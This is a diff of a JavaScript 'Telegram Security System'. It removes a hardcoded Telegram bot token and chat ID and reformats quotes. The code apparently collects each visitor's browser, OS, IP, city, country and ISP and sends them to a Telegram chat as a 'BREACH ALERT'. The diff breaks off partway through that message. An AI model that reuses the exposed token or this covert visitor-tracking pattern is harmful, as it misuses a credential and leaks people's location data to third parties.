@@ -1,21 +1,21 @@
-const TELEGRAM_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7978697496:AAEYF2jlx_aBpuWlqWPSD6Bu2hTIgSb8isc';
-const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '1380983917';
+const TELEGRAM_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
-console.log('Telegram Security System: ONLINE');
+console.log("Telegram Security System: ONLINE");
 
 const sendTelegramAlert = async (message) => {
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'HTML'
-      })
+        parse_mode: "HTML",
+      }),
     });
   } catch (error) {
-    console.error('Telegram Alert Failed:', error);
+    console.error("Telegram Alert Failed:", error);
   }
 };
 
@@ -25,64 +25,76 @@ const gatherForensicData = async () => {
   try {
     const forensic = {};
     const userAgent = navigator.userAgent;
-    let browserName = 'Unknown';
-    let osName = 'Unknown';
+    let browserName = "Unknown";
+    let osName = "Unknown";
 
-    if (/Edg/.test(userAgent)) browserName = 'Edge';
-    else if (/Chrome/.test(userAgent)) browserName = 'Chrome';
-    else if (/Safari/.test(userAgent)) browserName = 'Safari';
-    else if (/Firefox/.test(userAgent)) browserName = 'Firefox';
-    else if (/Opera|OPR/.test(userAgent)) browserName = 'Opera';
+    if (/Edg/.test(userAgent)) browserName = "Edge";
+    else if (/Chrome/.test(userAgent)) browserName = "Chrome";
+    else if (/Safari/.test(userAgent)) browserName = "Safari";
+    else if (/Firefox/.test(userAgent)) browserName = "Firefox";
+    else if (/Opera|OPR/.test(userAgent)) browserName = "Opera";
 
-    if (/Windows/.test(userAgent)) osName = 'Windows';
-    else if (/Mac/.test(userAgent)) osName = 'macOS';
-    else if (/Linux/.test(userAgent)) osName = 'Linux';
-    else if (/Android/.test(userAgent)) osName = 'Android';
-    else if (/iPhone|iPad/.test(userAgent)) osName = 'iOS';
+    if (/Windows/.test(userAgent)) osName = "Windows";
+    else if (/Mac/.test(userAgent)) osName = "macOS";
+    else if (/Linux/.test(userAgent)) osName = "Linux";
+    else if (/Android/.test(userAgent)) osName = "Android";
+    else if (/iPhone|iPad/.test(userAgent)) osName = "iOS";
 
     forensic.browser = browserName;
     forensic.os = osName;
     forensic.screenResolution = `${window.screen.width}x${window.screen.height}`;
 
     try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipRes = await fetch("https://api.ipify.org?format=json");
       const ipData = await ipRes.json();
-      forensic.ip = ipData.ip || 'Unknown';
+      forensic.ip = ipData.ip || "Unknown";
     } catch {
-      forensic.ip = 'Unknown';
+      forensic.ip = "Unknown";
     }
 
     try {
-      const geoRes = await fetch('https://ipapi.co/json/');
+      const geoRes = await fetch("https://ipapi.co/json/");
       const geoData = await geoRes.json();
-      forensic.city = geoData.city || 'Unknown';
-      forensic.region = geoData.region || 'Unknown';
-      forensic.country = geoData.country_name || 'Unknown';
-      forensic.isp = geoData.org || 'Unknown';
+      forensic.city = geoData.city || "Unknown";
+      forensic.region = geoData.region || "Unknown";
+      forensic.country = geoData.country_name || "Unknown";
+      forensic.isp = geoData.org || "Unknown";
     } catch {
-      forensic.city = 'Unknown';
-      forensic.region = 'Unknown';
-      forensic.country = 'Unknown';
-      forensic.isp = 'Unknown';
+      forensic.city = "Unknown";
+      forensic.region = "Unknown";
+      forensic.country = "Unknown";
+      forensic.isp = "Unknown";
     }
 
-    forensic.timestamp = new Date().toLocaleString('en-US', {
-      weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
-      hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short'
+    forensic.timestamp = new Date().toLocaleString("en-US", {
+      weekday: "short",
+      year: "numeric",
+      month: "short",
+      day: "numeric",
+      hour: "2-digit",
+      minute: "2-digit",
+      second: "2-digit",
+      timeZoneName: "short",
     });
 
     return forensic;
   } catch (error) {
-    console.error('Forensic data gathering failed:', error);
+    console.error("Forensic data gathering failed:", error);
     return {
-      browser: 'Unknown', os: 'Unknown', screenResolution: 'Unknown',
-      ip: 'Unknown', city: 'Unknown', region: 'Unknown',
-      country: 'Unknown', isp: 'Unknown', timestamp: new Date().toLocaleString()
+      browser: "Unknown",
+      os: "Unknown",
+      screenResolution: "Unknown",
+      ip: "Unknown",
+      city: "Unknown",
+      region: "Unknown",
+      country: "Unknown",
+      isp: "Unknown",
+      timestamp: new Date().toLocaleString(),
     };
   }
 };
 
-export const sendForensicAlert = async (targetEmail, alertType = 'BREACH') => {
+export const sendForensicAlert = async (targetEmail, alertType = "BREACH") => {
   const forensic = await gatherForensicData();
 
   const message = `🚨 <b>INSTITUTIONAL ${alertType} ALERT</b>
